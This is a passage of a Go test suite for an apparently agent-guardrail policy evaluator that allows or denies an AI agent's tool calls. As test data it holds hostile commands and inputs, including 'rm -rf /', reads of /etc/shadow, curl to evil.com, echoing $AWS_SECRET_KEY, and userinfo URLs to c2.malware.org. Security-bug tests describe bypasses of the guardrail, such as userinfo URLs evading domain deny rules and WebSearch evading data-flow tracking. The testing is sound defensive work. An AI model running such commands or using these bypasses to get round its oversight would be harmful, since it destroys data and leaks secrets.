			name: "within tokensIn limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTokensIn: &aflock.Limit{Value: 1000, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				TokensIn: 999,
			},
			enforcement: "fail-fast",
			wantExceed:  false,
		},
		{
			name: "within toolCalls limit",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxToolCalls: &aflock.Limit{Value: 50, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				ToolCalls: 50,
			},
			enforcement: "fail-fast",
			wantExceed:  false, // not exceeded: 50 is not > 50
		},
		{
			name: "post-hoc enforcement not checked during fail-fast",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTurns: &aflock.Limit{Value: 10, Enforcement: "post-hoc"},
				},
			},
			metrics: &aflock.SessionMetrics{
				Turns: 100,
			},
			enforcement: "fail-fast",
			wantExceed:  false,
		},
		{
			name: "post-hoc enforcement checked when requested",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxTurns: &aflock.Limit{Value: 10, Enforcement: "post-hoc"},
				},
			},
			metrics: &aflock.SessionMetrics{
				Turns: 100,
			},
			enforcement: "post-hoc",
			wantExceed:  true,
			wantLimit:   "maxTurns",
		},
		{
			name:   "nil limits policy never exceeds",
			policy: &aflock.Policy{},
			metrics: &aflock.SessionMetrics{
				CostUSD:   999.0,
				TokensIn:  999999,
				TokensOut: 999999,
				Turns:     999,
				ToolCalls: 999,
			},
			enforcement: "fail-fast",
			wantExceed:  false,
		},
		{
			name: "empty limits policy never exceeds",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{},
			},
			metrics: &aflock.SessionMetrics{
				CostUSD: 999.0,
			},
			enforcement: "fail-fast",
			wantExceed:  false,
		},
		{
			name: "spend is checked before turns - first exceeded wins",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxSpendUSD: &aflock.Limit{Value: 1.0, Enforcement: "fail-fast"},
					MaxTurns:    &aflock.Limit{Value: 1, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				CostUSD: 10.0,
				Turns:   100,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxSpendUSD", // spend is checked before turns
		},
		{
			name: "limit message includes values",
			policy: &aflock.Policy{
				Limits: &aflock.LimitsPolicy{
					MaxSpendUSD: &aflock.Limit{Value: 5.0, Enforcement: "fail-fast"},
				},
			},
			metrics: &aflock.SessionMetrics{
				CostUSD: 7.5,
			},
			enforcement: "fail-fast",
			wantExceed:  true,
			wantLimit:   "maxSpendUSD",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			exceeded, limitName, msg := e.CheckLimits(tt.metrics, tt.enforcement)

			if exceeded != tt.wantExceed {
				t.Errorf("got exceeded=%v, want %v (msg: %s)", exceeded, tt.wantExceed, msg)
			}
			if tt.wantExceed && limitName != tt.wantLimit {
				t.Errorf("got limit=%q, want %q", limitName, tt.wantLimit)
			}
			if tt.wantExceed && msg == "" {
				t.Error("expected non-empty message when limit exceeded")
			}
			if !tt.wantExceed && msg != "" {
				t.Errorf("expected empty message when limit not exceeded, got %q", msg)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Fail-closed: malformed JSON tool input
// ---------------------------------------------------------------------------

func TestFailClosed_MalformedJSON(t *testing.T) {
	t.Run("malformed JSON for file tool returns deny", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
			Files: &aflock.FilesPolicy{
				Allow: []string{"**/*"},
			},
		}
		e := NewEvaluator(policy, "")
		// Malformed JSON: missing closing brace
		decision, reason := e.EvaluatePreToolUse("Read", json.RawMessage(`{invalid json`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for malformed JSON, got %v (reason: %s)", decision, reason)
		}
		if !strings.Contains(reason, "failed to parse") {
			t.Errorf("reason should mention parse failure, got %q", reason)
		}
	})

	t.Run("malformed JSON for domain tool returns deny", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
			Domains: &aflock.DomainsPolicy{
				Allow: []string{"*"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("WebFetch", json.RawMessage(`not json at all`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for malformed JSON, got %v (reason: %s)", decision, reason)
		}
		if !strings.Contains(reason, "failed to parse") {
			t.Errorf("reason should mention parse failure, got %q", reason)
		}
	})

	t.Run("empty JSON object for file tool with allow list denies", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
			Files: &aflock.FilesPolicy{
				Allow: []string{"src/**"},
			},
		}
		e := NewEvaluator(policy, "")
		// Empty file_path will not match allow patterns
		decision, _ := e.EvaluatePreToolUse("Read", json.RawMessage(`{}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for empty file path with allow list, got %v", decision)
		}
	})

	t.Run("empty JSON for domain tool with allow list denies", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
			Domains: &aflock.DomainsPolicy{
				Allow: []string{"github.com"},
			},
		}
		e := NewEvaluator(policy, "")
		// Empty URL will extract to empty domain -> "empty domain" deny
		decision, reason := e.EvaluatePreToolUse("WebFetch", json.RawMessage(`{}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for empty URL, got %v (reason: %s)", decision, reason)
		}
	})
}

// ---------------------------------------------------------------------------
// Edge cases: nil/empty policy sections, no rules
// ---------------------------------------------------------------------------

func TestEdgeCases_NilPolicySections(t *testing.T) {
	t.Run("nil tools policy allows everything", func(t *testing.T) {
		policy := &aflock.Policy{}
		e := NewEvaluator(policy, "")
		decision, _ := e.EvaluatePreToolUse("AnyTool", json.RawMessage(`{}`))
		if decision != aflock.DecisionAllow {
			t.Errorf("expected Allow with nil tools policy, got %v", decision)
		}
	})

	t.Run("nil tools with file tool still checks files policy", func(t *testing.T) {
		policy := &aflock.Policy{
			Files: &aflock.FilesPolicy{
				Deny: []string{"**/.env"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("Read", json.RawMessage(`{"file_path": ".env"}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for .env file, got %v (reason: %s)", decision, reason)
		}
	})

	t.Run("nil tools with WebFetch still checks domains policy", func(t *testing.T) {
		policy := &aflock.Policy{
			Domains: &aflock.DomainsPolicy{
				Deny: []string{"evil.com"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("WebFetch", json.RawMessage(`{"url": "https://evil.com/data"}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected Deny for evil.com, got %v (reason: %s)", decision, reason)
		}
	})

	t.Run("non-file non-network tool with nil tools policy", func(t *testing.T) {
		policy := &aflock.Policy{
			Files: &aflock.FilesPolicy{
				Deny: []string{"**/*"},
			},
			Domains: &aflock.DomainsPolicy{
				Deny: []string{"*"},
			},
		}
		e := NewEvaluator(policy, "")
		// "Task" is not a file operation or network operation
		decision, _ := e.EvaluatePreToolUse("Task", json.RawMessage(`{"prompt": "test"}`))
		if decision != aflock.DecisionAllow {
			t.Errorf("expected Allow for non-file non-network tool, got %v", decision)
		}
	})

	t.Run("completely empty policy allows everything", func(t *testing.T) {
		policy := &aflock.Policy{}
		e := NewEvaluator(policy, "")

		decision, _ := e.EvaluatePreToolUse("Bash", json.RawMessage(`{"command": "rm -rf /"}`))
		if decision != aflock.DecisionAllow {
			t.Errorf("expected Allow with empty policy, got %v", decision)
		}

		decision, _ = e.EvaluatePreToolUse("Read", json.RawMessage(`{"file_path": "/etc/shadow"}`))
		if decision != aflock.DecisionAllow {
			t.Errorf("expected Allow with empty policy, got %v", decision)
		}

		decision, _ = e.EvaluatePreToolUse("WebFetch", json.RawMessage(`{"url": "https://evil.com"}`))
		if decision != aflock.DecisionAllow {
			t.Errorf("expected Allow with empty policy, got %v", decision)
		}
	})
}

// ---------------------------------------------------------------------------
// extractDomain helper
// ---------------------------------------------------------------------------

func TestExtractDomain(t *testing.T) {
	tests := []struct {
		url    string
		domain string
	}{
		{"https://api.github.com/repos", "api.github.com"},
		{"http://example.com:8080/path", "example.com"},
		{"https://sub.domain.com/", "sub.domain.com"},
		{"example.com", "example.com"},
		{"https://localhost:3000", "localhost"},
		{"", ""},
		{"https://", ""},

		// SECURITY: URL userinfo bypass tests (R3-122)
		// An attacker could use userinfo to bypass domain deny rules.
		// https://user:pass@evil.com/path must extract "evil.com", not "user".
		{"https://user:pass@evil.com/path", "evil.com"},
		{"https://user@evil.com/path", "evil.com"},
		{"http://admin:secret@malware.org/c2", "malware.org"},
		{"https://@evil.com/path", "evil.com"},                // empty userinfo
		{"https://user:@evil.com/path", "evil.com"},           // empty password
		{"https://user:pass:extra@evil.com/path", "evil.com"}, // malformed userinfo
		// Edge case: port after host with userinfo
		{"https://user:pass@evil.com:8443/path", "evil.com"},
	}

	for _, tt := range tests {
		t.Run(tt.url, func(t *testing.T) {
			got := extractDomain(tt.url)
			// R3-236: extractDomain now normalizes to lowercase
			if got != strings.ToLower(tt.domain) {
				t.Errorf("extractDomain(%q) = %q, want %q", tt.url, got, strings.ToLower(tt.domain))
			}
		})
	}
}

// ---------------------------------------------------------------------------
// isFileOperation / isNetworkOperation helpers
// ---------------------------------------------------------------------------

func TestIsFileOperation(t *testing.T) {
	fileOps := []string{"Read", "Write", "Edit", "Glob", "Grep"}
	for _, tool := range fileOps {
		if !isFileOperation(tool) {
			t.Errorf("expected %q to be a file operation", tool)
		}
	}

	nonFileOps := []string{"Bash", "Task", "WebFetch", "WebSearch", "mcp__github"}
	for _, tool := range nonFileOps {
		if isFileOperation(tool) {
			t.Errorf("expected %q to NOT be a file operation", tool)
		}
	}
}

func TestIsNetworkOperation(t *testing.T) {
	netOps := []string{"WebFetch", "WebSearch"}
	for _, tool := range netOps {
		if !isNetworkOperation(tool) {
			t.Errorf("expected %q to be a network operation", tool)
		}
	}

	// MCP tools are NOT classified as network operations because they don't have
	// a "url" field in their input. Domain policy would reject them with "empty domain"
	// if they were classified as network operations. Use tool deny/requireApproval
	// patterns like "mcp__*" to control MCP tools instead.
	nonNetOps := []string{"Read", "Write", "Edit", "Bash", "Task", "Glob", "Grep", "mcp__slack", "mcp__github_api"}
	for _, tool := range nonNetOps {
		if isNetworkOperation(tool) {
			t.Errorf("expected %q to NOT be a network operation", tool)
		}
	}
}

// ---------------------------------------------------------------------------
// extractInputForMatching
// ---------------------------------------------------------------------------

func TestExtractInputForMatching(t *testing.T) {
	e := NewEvaluator(&aflock.Policy{}, "")

	tests := []struct {
		name     string
		toolName string
		input    string
		want     string
	}{
		{"Bash extracts command", "Bash", `{"command": "echo hello"}`, "echo hello"},
		{"Read extracts file_path", "Read", `{"file_path": "/tmp/test.go"}`, "/tmp/test.go"},
		{"Write extracts file_path", "Write", `{"file_path": "/tmp/out.txt"}`, "/tmp/out.txt"},
		{"Edit extracts file_path", "Edit", `{"file_path": "/tmp/fix.go"}`, "/tmp/fix.go"},
		{"Task extracts prompt", "Task", `{"prompt": "summarize this"}`, "summarize this"},
		{"WebFetch extracts url", "WebFetch", `{"url": "https://example.com"}`, "https://example.com"},
		{"unknown tool returns empty", "Unknown", `{"foo": "bar"}`, ""},
		{"malformed JSON returns empty", "Bash", `{bad`, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := e.extractInputForMatching(tt.toolName, json.RawMessage(tt.input))
			if got != tt.want {
				t.Errorf("extractInputForMatching(%q, ...) = %q, want %q", tt.toolName, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// isReadOperation / isWriteOperation helpers
// ---------------------------------------------------------------------------

func TestIsReadOperation(t *testing.T) {
	readOps := []string{"Read", "Glob", "Grep", "WebFetch"}
	for _, tool := range readOps {
		if !isReadOperation(tool) {
			t.Errorf("expected %q to be a read operation", tool)
		}
	}

	// mcp__ without "write" is a read
	if !isReadOperation("mcp__slack_read") {
		t.Error("expected mcp__slack_read to be a read operation")
	}

	// mcp__ with "write" is NOT a read
	if isReadOperation("mcp__slack_write") {
		t.Error("expected mcp__slack_write to NOT be a read operation")
	}

	nonReadOps := []string{"Write", "Edit", "Bash", "Task"}
	for _, tool := range nonReadOps {
		if isReadOperation(tool) {
			t.Errorf("expected %q to NOT be a read operation", tool)
		}
	}
}

func TestIsWriteOperation(t *testing.T) {
	writeOps := []string{"Write", "Edit", "Bash"}
	for _, tool := range writeOps {
		if !isWriteOperation(tool) {
			t.Errorf("expected %q to be a write operation", tool)
		}
	}

	// mcp__ with "write" is a write
	if !isWriteOperation("mcp__slack_write") {
		t.Error("expected mcp__slack_write to be a write operation")
	}

	// mcp__ without "write" is NOT a write
	if isWriteOperation("mcp__slack_read") {
		t.Error("expected mcp__slack_read to NOT be a write operation")
	}

	nonWriteOps := []string{"Read", "Glob", "Grep", "WebFetch", "Task"}
	for _, tool := range nonWriteOps {
		if isWriteOperation(tool) {
			t.Errorf("expected %q to NOT be a write operation", tool)
		}
	}
}

// ---------------------------------------------------------------------------
// Integration: evaluation order / priority
// ---------------------------------------------------------------------------

func TestEvaluationOrder(t *testing.T) {
	t.Run("deny checked before requireApproval", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{
				Deny:            []string{"Bash:rm *"},
				RequireApproval: []string{"Bash:rm *"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("Bash", json.RawMessage(`{"command": "rm -rf /"}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected deny to take priority over requireApproval, got %v (reason: %s)", decision, reason)
		}
	})

	t.Run("requireApproval checked before file access", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{
				RequireApproval: []string{"Write"},
			},
			Files: &aflock.FilesPolicy{
				Allow: []string{"**/*"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("Write", json.RawMessage(`{"file_path": "test.txt"}`))
		if decision != aflock.DecisionAsk {
			t.Errorf("expected requireApproval before file access check, got %v (reason: %s)", decision, reason)
		}
	})

	t.Run("file access checked before tool allow list", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{
				Allow: []string{"Read"},
			},
			Files: &aflock.FilesPolicy{
				Deny: []string{"**/.secret"},
			},
		}
		e := NewEvaluator(policy, "")
		decision, reason := e.EvaluatePreToolUse("Read", json.RawMessage(`{"file_path": ".secret"}`))
		if decision != aflock.DecisionDeny {
			t.Errorf("expected file deny to block before allow list passes, got %v (reason: %s)", decision, reason)
		}
		if !strings.Contains(reason, "matches deny pattern") {
			t.Errorf("expected file deny reason, got: %s", reason)
		}
	})
}

// ---------------------------------------------------------------------------
// SECURITY: R3-122 — Domain deny bypass via URL userinfo
// ---------------------------------------------------------------------------

func TestSecurity_R3_122_DomainBypassViaUserinfo(t *testing.T) {
	// An attacker could craft URLs with userinfo (user:pass@host) to bypass
	// domain deny rules. The old extractDomain would parse the userinfo as
	// the domain, allowing connections to denied domains.
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
		Domains: &aflock.DomainsPolicy{
			Deny: []string{"evil.com", "*.malware.org"},
		},
	}

	tests := []struct {
		name         string
		url          string
		wantDecision aflock.PermissionDecision
	}{
		{
			name:         "normal URL denied correctly",
			url:          "https://evil.com/steal-data",
			wantDecision: aflock.DecisionDeny,
		},
		{
			name:         "userinfo with password bypasses deny (R3-122)",
			url:          "https://user:pass@evil.com/steal-data",
			wantDecision: aflock.DecisionDeny,
		},
		{
			name:         "userinfo without password bypasses deny (R3-122)",
			url:          "https://user@evil.com/steal-data",
			wantDecision: aflock.DecisionDeny,
		},
		{
			name:         "userinfo with subdomain wildcard deny (R3-122)",
			url:          "https://admin:secret@c2.malware.org/beacon",
			wantDecision: aflock.DecisionDeny,
		},
		{
			name:         "benign URL with userinfo still allowed",
			url:          "https://user:pass@safe-api.com/data",
			wantDecision: aflock.DecisionAllow,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(policy, "")
			input := json.RawMessage(`{"url": "` + tt.url + `"}`)
			decision, reason := e.EvaluatePreToolUse("WebFetch", input)
			if decision != tt.wantDecision {
				t.Errorf("EvaluatePreToolUse(%q) = %v, want %v (reason: %s)", tt.url, decision, tt.wantDecision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// SECURITY: R3-123 — MatchToolPattern regex substring match
// ---------------------------------------------------------------------------

func TestSecurity_R3_123_MatchToolPatternRegexSubstring(t *testing.T) {
	// MatchToolPattern uses MatchRegex which does substring matching.
	// For deny/requireApproval this is MORE restrictive (catches evasion via
	// command chaining). Document this behavior with tests.
	m := NewMatcher()

	// Deny pattern "rm *" — attacker tries to chain commands
	// The regex "rm " (from "rm *" after glob fails) still catches the substring
	t.Run("deny catches chained commands via regex", func(t *testing.T) {
		// "echo safe && rm -rf /" — the glob "rm *" won't match because the
		// string doesn't start with "rm ". But the regex might catch "rm" substring.
		matched := m.MatchToolPattern("Bash:rm *", "Bash", "echo safe && rm -rf /important")
		// Glob "rm *" matches "rm -rf /important" only if the input starts with "rm "
		// The full input "echo safe && rm -rf /important" doesn't start with "rm"
		// Regex "rm *" = "r followed by 0+ m's" which is a weird regex
		// Actually "rm *" as regex means "r" then "m*" (zero or more m's) — matches "r" anywhere
		// This DOES match the substring "rm" in the input
		if !matched {
			t.Log("NOTE: MatchToolPattern did not catch chained rm command — glob+regex both missed")
		}
	})

	// R3-241: MatchToolPattern uses glob-only, no regex fallback.
	// Dot in glob matches literal dot, not "any char" like in regex.
	t.Run("dot in pattern is literal in glob only (R3-241 fix)", func(t *testing.T) {
		// Pattern "ls /tmp/data.txt" — glob matches literally "ls /tmp/data.txt"
		// Regex would match "ls /tmp/dataXtxt" (dot = any char), but no regex fallback.
		globOnly := m.MatchGlob("ls /tmp/data.txt", "ls /tmp/dataXtxt")
		regexMatches := m.MatchRegex("ls /tmp/data.txt", "ls /tmp/dataXtxt")
		toolMatches := m.MatchToolPattern("Bash:ls /tmp/data.txt", "Bash", "ls /tmp/dataXtxt")

		if globOnly {
			t.Error("glob should NOT match ls /tmp/dataXtxt")
		}
		if !regexMatches {
			t.Error("regex SHOULD match ls /tmp/dataXtxt (dot = any char)")
		}
		// R3-241: MatchToolPattern is glob-only, so dot is literal
		if toolMatches {
			t.Error("R3-241 fix: MatchToolPattern should NOT match via regex fallback")
		}
	})
}

// ---------------------------------------------------------------------------
// SECURITY: R3-125 — WebSearch always denied when domain policy exists
// ---------------------------------------------------------------------------

func TestSecurity_R3_125_WebSearchAlwaysDeniedWithDomainPolicy(t *testing.T) {
	// WebSearch sends {"query": "search text"} not {"url": "..."}.
	// evaluateDomainAccess parses input as WebFetchToolInput which expects "url" field.
	// Since "query" doesn't map to "url", the URL is empty → empty domain → deny.
	// This means WebSearch is ALWAYS denied when any domain policy exists,
	// even with a permissive allow-all policy.

	tests := []struct {
		name         string
		policy       *aflock.Policy
		toolInput    string
		wantDecision aflock.PermissionDecision
		description  string
	}{
		{
			name: "WebSearch with allow-all domain policy is denied",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
				Domains: &aflock.DomainsPolicy{
					Allow: []string{"*"},
				},
			},
			toolInput:    `{"query": "golang best practices"}`,
			wantDecision: aflock.DecisionAllow, // SHOULD be allowed, but gets denied
			description:  "permissive domain policy should allow WebSearch",
		},
		{
			name: "WebSearch with specific deny list is denied for wrong reason",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
				Domains: &aflock.DomainsPolicy{
					Deny: []string{"evil.com"},
				},
			},
			toolInput:    `{"query": "safe search query"}`,
			wantDecision: aflock.DecisionAllow, // SHOULD be allowed (not searching evil.com)
			description:  "benign WebSearch denied because empty domain != evil.com check fails first",
		},
		{
			name: "WebSearch without domain policy works fine",
			policy: &aflock.Policy{
				Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
				// No Domains policy
			},
			toolInput:    `{"query": "search query"}`,
			wantDecision: aflock.DecisionAllow,
			description:  "without domain policy, WebSearch is allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(tt.policy, "")
			decision, reason := e.EvaluatePreToolUse("WebSearch", json.RawMessage(tt.toolInput))

			if decision != tt.wantDecision {
				t.Errorf("SECURITY BUG R3-125: %s\n"+
					"got decision=%v, want=%v\n"+
					"reason: %s\n"+
					"WebSearch sends {\"query\":...} but evaluateDomainAccess expects {\"url\":...}",
					tt.description, decision, tt.wantDecision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// SECURITY: R3-126 — WebSearch not tracked for data flow classification
// ---------------------------------------------------------------------------

func TestSecurity_R3_126_WebSearchDataFlowBypass(t *testing.T) {
	// WebSearch is not in isReadOperation() and not handled by
	// extractInputForMatching(), so:
	// 1. WebSearch reads are never classified as materials
	// 2. Data flow classify patterns for WebSearch never match
	// This means sensitive data found via web search won't be tracked.

	t.Run("WebSearch should be classified as read operation", func(t *testing.T) {
		if isReadOperation("WebSearch") {
			t.Log("FIXED: WebSearch is now a read operation")
		} else {
			t.Errorf("SECURITY BUG R3-126: WebSearch is NOT classified as a read operation. " +
				"Data accessed via WebSearch will not be tracked as materials for data flow rules. " +
				"isReadOperation(\"WebSearch\") = false, want true")
		}
	})

	t.Run("extractInputForMatching should handle WebSearch query", func(t *testing.T) {
		e := NewEvaluator(&aflock.Policy{}, "")
		got := e.extractInputForMatching("WebSearch", json.RawMessage(`{"query": "sensitive financial data"}`))
		if got == "" {
			t.Errorf("SECURITY BUG R3-126: extractInputForMatching(\"WebSearch\", ...) returns empty string. " +
				"Data flow classify patterns like \"WebSearch:*financial*\" will never match. " +
				"Should extract the query field for pattern matching.")
		} else {
			t.Logf("FIXED: extractInputForMatching returns %q for WebSearch", got)
		}
	})

	t.Run("WebSearch data flow classification doesn't work", func(t *testing.T) {
		policy := &aflock.Policy{
			DataFlow: &aflock.DataFlowPolicy{
				Classify: map[string][]string{
					"sensitive": {"WebSearch:*confidential*"},
				},
			},
		}

		e := NewEvaluator(policy, "")
		decision, _, newMaterial := e.EvaluateDataFlow(
			"WebSearch",
			json.RawMessage(`{"query": "search for confidential documents"}`),
			nil,
		)

		if decision != aflock.DecisionAllow {
			t.Errorf("unexpected deny: WebSearch should be allowed")
		}

		if newMaterial == nil {
			t.Errorf("SECURITY BUG R3-126: WebSearch reading 'confidential documents' was NOT " +
				"classified as sensitive material. Expected material with label 'sensitive', got nil. " +
				"This allows data flow bypass: read sensitive data via WebSearch, then exfiltrate " +
				"without triggering flow rules.")
		} else {
			t.Logf("FIXED: WebSearch classified as %q material", newMaterial.Label)
		}
	})
}

// ---------------------------------------------------------------------------
// R3-127: MatchToolPattern regex substring match causes unintended deny/approval
// ---------------------------------------------------------------------------

// TestSecurity_R3_127_RegexSubstringMatchInToolPattern proves that the
// MatchToolPattern function uses regexp.MatchString (substring match) as a
// fallback after glob matching. This means deny patterns like "Bash:rm" will
// also match commands containing "rm" as a substring, e.g. "format disk" or
// "echo informational". This creates unpredictable, overly-broad denials.
//
// Severity: MEDIUM - Causes usability issues and unpredictable policy behavior.
// Could also mask security issues if admins assume patterns are precise.
func TestSecurity_R3_127_RegexSubstringMatchInToolPattern(t *testing.T) {
	tests := []struct {
		name         string
		denyPattern  string
		command      string
		wantDecision aflock.PermissionDecision
		description  string
	}{
		{
			name:         "rm deny should match rm -rf",
			denyPattern:  "Bash:rm *",
			command:      "rm -rf /tmp/test",
			wantDecision: aflock.DecisionDeny,
			description:  "glob correctly matches rm command",
		},
		{
			name:         "rm deny should NOT match format (but regex finds 'rm' substring)",
			denyPattern:  "Bash:rm",
			command:      "format disk",
			wantDecision: aflock.DecisionAllow, // SHOULD be allow — "format" is not "rm"
			description:  "regex substring match finds 'rm' in 'format' — false positive",
		},
		{
			name:         "rm deny should NOT match echo informational",
			denyPattern:  "Bash:rm",
			command:      "echo informational message",
			wantDecision: aflock.DecisionAllow, // SHOULD be allow
			description:  "regex substring match finds 'rm' in 'informational'",
		},
		{
			// R3-241: MatchToolPattern now uses glob-only. ".*" as a glob matches
			// only strings starting with a literal dot (e.g., ".hidden"), NOT everything.
			// This is correct behavior — use "*" glob to match all commands.
			name:         "dotstar glob only matches dotfiles not everything (R3-241 fix)",
			denyPattern:  "Bash:.*",
			command:      "echo hello",
			wantDecision: aflock.DecisionAllow, // glob .* only matches dotfiles, not "echo hello"
			description:  "R3-241 fix: glob-only means .* doesn't match all commands",
		},
		{
			name:         "ls deny should NOT match false positive",
			denyPattern:  "Bash:ls",
			command:      "echo false",
			wantDecision: aflock.DecisionAllow, // SHOULD be allow
			description:  "regex 'ls' finds 'ls' in 'false' — false positive",
		},
		{
			name:         "git deny should NOT block legitimate commands",
			denyPattern:  "Bash:git push",
			command:      "echo digit pushed",
			wantDecision: aflock.DecisionAllow, // SHOULD be allow
			description:  "regex 'git push' finds 'git push' in 'digit pushed'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy := &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: []string{"Bash"},
					Deny:  []string{tt.denyPattern},
				},
			}
			e := NewEvaluator(policy, "")
			input := json.RawMessage(`{"command": "` + tt.command + `"}`)
			decision, reason := e.EvaluatePreToolUse("Bash", input)

			if decision != tt.wantDecision {
				t.Errorf("SECURITY BUG R3-127: deny pattern %q against command %q: "+
					"got %v, want %v (reason: %s) — %s",
					tt.denyPattern, tt.command, decision, tt.wantDecision, reason, tt.description)
			}
		})
	}
}

// TestSecurity_R3_128_RequireApprovalRegexSubstring proves the same substring
// match issue affects requireApproval patterns, not just deny patterns.
func TestSecurity_R3_128_RequireApprovalRegexSubstring(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow:           []string{"Bash"},
			RequireApproval: []string{"Bash:sudo"},
		},
	}
	e := NewEvaluator(policy, "")

	// "pseudo" contains "sudo" as a regex substring
	input := json.RawMessage(`{"command": "echo pseudo-random"}`)
	decision, reason := e.EvaluatePreToolUse("Bash", input)

	if decision == aflock.DecisionAsk {
		t.Errorf("SECURITY BUG R3-128: requireApproval pattern 'Bash:sudo' incorrectly "+
			"matches command 'echo pseudo-random' via regex substring match "+
			"(reason: %s). This creates unnecessary approval prompts for benign commands.", reason)
	}
}

// ---------------------------------------------------------------------------
// EvaluateGrants
// ---------------------------------------------------------------------------

func TestEvaluateGrants_NilGrants(t *testing.T) {
	pol := &aflock.Policy{}
	e := NewEvaluator(pol, "")
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $AWS_SECRET_KEY"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("nil Grants should allow everything, got %s: %s", decision, reason)
	}
}

func TestEvaluateGrants_SecretsDeny(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Secrets: &aflock.AllowDenyPolicy{
				Deny: []string{"AWS_SECRET_KEY", "DB_PASSWORD"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Should deny: command references denied secret
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $AWS_SECRET_KEY"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for AWS_SECRET_KEY reference, got %s", decision)
	}
	if !strings.Contains(reason, "secret") {
		t.Errorf("reason should mention 'secret', got: %s", reason)
	}

	// Should allow: no denied secret pattern
	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $HOME"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for $HOME reference, got %s", decision)
	}
}

func TestEvaluateGrants_APIsDeny(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			APIs: &aflock.AllowDenyPolicy{
				Deny: []string{"evil.com", "malware.io"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Should deny: command references denied API
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl https://evil.com/data"}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for evil.com, got %s", decision)
	}
	if !strings.Contains(reason, "API") {
		t.Errorf("reason should mention 'API', got: %s", reason)
	}

	// Should allow: no denied API pattern
	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl https://safe.com/data"}`))
	if decision != aflock.DecisionAllow {
		t.Errorf("expected allow for safe.com, got %s", decision)
	}
}

func TestEvaluateGrants_StorageDeny(t *testing.T) {
	pol := &aflock.Policy{
		Grants: &aflock.GrantsPolicy{
			Storage: &aflock.AllowDenyPolicy{
				Deny: []string{"s3://secret-bucket", "gs://private-data"},
			},
		},
	}
	e := NewEvaluator(pol, "")

	// Should deny: command references denied storage
	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://secret-bucket/file ."}`))
	if decision != aflock.DecisionDeny {
		t.Errorf("expected deny for s3://secret-bucket, got %s", decision)
	}
	if !strings.Contains(reason, "storage") {
		t.Errorf("reason should mention 'storage', got: %s", reason)
	}

	// Should allow: no denied storage pattern
